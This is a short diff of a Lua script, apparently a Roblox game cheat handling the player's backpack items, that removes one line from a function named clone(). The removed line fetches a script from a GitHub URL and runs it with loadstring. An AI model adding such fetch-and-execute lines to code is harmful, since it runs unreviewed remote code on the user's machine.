@@ -110,7 +110,6 @@ local function Count_Item_Off_Main()
 end
 
 local function clone()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/duongcuteleu/main/refs/heads/main/MenuScrip"))()
 	local findmain = get_main()
 	local brainrots = {}
 	for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
